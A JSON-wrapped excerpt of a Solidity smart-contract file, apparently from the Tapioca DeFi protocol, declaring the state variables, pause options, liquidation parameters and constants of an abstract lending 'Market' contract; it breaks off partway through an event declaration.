      "content": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.22;\n\n// External\nimport {RebaseLibrary, Rebase} from \"@boringcrypto/boring-solidity/contracts/libraries/BoringRebase.sol\";\nimport {IERC20} from \"@boringcrypto/boring-solidity/contracts/ERC20.sol\";\nimport {Ownable} from \"@openzeppelin/contracts/access/Ownable.sol\";\n\n// Tapioca\nimport {ILeverageExecutor} from \"tapioca-periph/interfaces/bar/ILeverageExecutor.sol\";\nimport {ITapiocaOracle} from \"tapioca-periph/interfaces/periph/ITapiocaOracle.sol\";\nimport {IYieldBox} from \"tapioca-periph/interfaces/yieldbox/IYieldBox.sol\";\nimport {IPearlmit} from \"tapioca-periph/interfaces/periph/IPearlmit.sol\";\nimport {IPenrose} from \"tapioca-periph/interfaces/bar/IPenrose.sol\";\nimport {MarketERC20} from \"./MarketERC20.sol\";\n\n/*\n\n████████╗ █████╗ ██████╗ ██╗ ██████╗  ██████╗ █████╗ \n╚══██╔══╝██╔══██╗██╔══██╗██║██╔═══██╗██╔════╝██╔══██╗\n   ██║   ███████║██████╔╝██║██║   ██║██║     ███████║\n   ██║   ██╔══██║██╔═══╝ ██║██║   ██║██║     ██╔══██║\n   ██║   ██║  ██║██║     ██║╚██████╔╝╚██████╗██║  ██║\n   ╚═╝   ╚═╝  ╚═╝╚═╝     ╚═╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝\n   \n*/\n\nabstract contract Market is MarketERC20, Ownable {\n    using RebaseLibrary for Rebase;\n\n    // ************ //\n    // *** VARS *** //\n    // ************ //\n    enum PauseType {\n        Borrow,\n        Repay,\n        AddCollateral,\n        RemoveCollateral,\n        Liquidation,\n        LeverageBuy,\n        LeverageSell,\n        AddAsset,\n        RemoveAsset\n    }\n\n    /// @notice pause options\n    mapping(PauseType pauseProp => bool pauseStatus) public pauseOptions;\n    /// @notice conservator's addresss\n    /// @dev conservator can pause/unpause the contract\n    address public conservator;\n\n    /// @notice returns YieldBox address\n    IYieldBox public yieldBox;\n    /// @notice returns Penrose address\n    IPenrose public penrose;\n\n    IPearlmit public pearlmit;\n\n    /// @notice collateral token address\n    IERC20 public collateral;\n    /// @notice collateral token YieldBox id\n    uint256 public collateralId;\n    /// @notice asset token address\n    IERC20 public asset;\n    /// @notice asset token YieldBox id\n    uint256 public assetId;\n    /// @notice oracle address\n    ITapiocaOracle public oracle;\n    /// @notice oracleData\n    bytes public oracleData;\n    /// @notice Exchange and interest rate tracking.\n    /// This is 'cached' here because calls to Oracles can be very expensive.\n    /// Asset -> collateral = assetAmount * exchangeRate.\n    uint256 public exchangeRate;\n    /// @notice cached rate is valid only for the `rateValidDuration` time\n    uint256 public rateValidDuration;\n    /// @notice latest timestamp when `exchangeRate` was updated\n    uint256 public rateTimestamp;\n\n    /// @notice total amount borrowed\n    /// @dev elastic = Total token amount to be repayed by borrowers, base = Total parts of the debt held by borrowers\n    Rebase public totalBorrow;\n    /// @notice total collateral supplied\n    uint256 public totalCollateralShare;\n    /// @notice max borrow cap\n    uint256 public totalBorrowCap;\n    /// @notice borrow amount per user\n    mapping(address => uint256) public userBorrowPart;\n    /// @notice collateral share per user\n    mapping(address => uint256) public userCollateralShare;\n\n    /// @notice accrual protocol rewards\n    uint256 public protocolFee; // 10%\n    /// @notice min % a liquidator can receive in rewards\n    uint256 public minLiquidatorReward = 8e4; //80%\n    /// @notice max % a liquidator can receive in rewards\n    uint256 public maxLiquidatorReward = 9e4; //90%\n    /// @notice max liquidatable bonus amount\n    /// @dev max % added to the amount that can be liquidated\n    uint256 public liquidationBonusAmount = 1e4; //10%\n    /// @notice collateralization rate\n    uint256 public collateralizationRate; // 75%\n    /// @notice liquidation collateralization rate\n    uint256 public liquidationCollateralizationRate; //80%\n    /// @notice liquidation multiplier used to compute liquidator rewards\n    uint256 public liquidationMultiplier = 12000; //12%\n    /// @notice returns the leverage executor\n    ILeverageExecutor public leverageExecutor;\n\n    // ***************** //\n    // *** CONSTANTS *** //\n    // ***************** //\n    uint256 internal EXCHANGE_RATE_PRECISION; //not costant, but can only be set in the 'init' method\n    uint256 internal constant FEE_PRECISION = 1e5;\n    uint256 internal constant FEE_PRECISION_DECIMALS = 5;\n\n    error ExchangeRateNotValid();\n    error AllowanceNotValid();\n\n    // ************** //\n    // *** EVENTS *** //\n    // ************** //\n    /// @notice event emitted when `leverageExecutor` is updated\n    event LeverageExecutor"
    }
  ]
}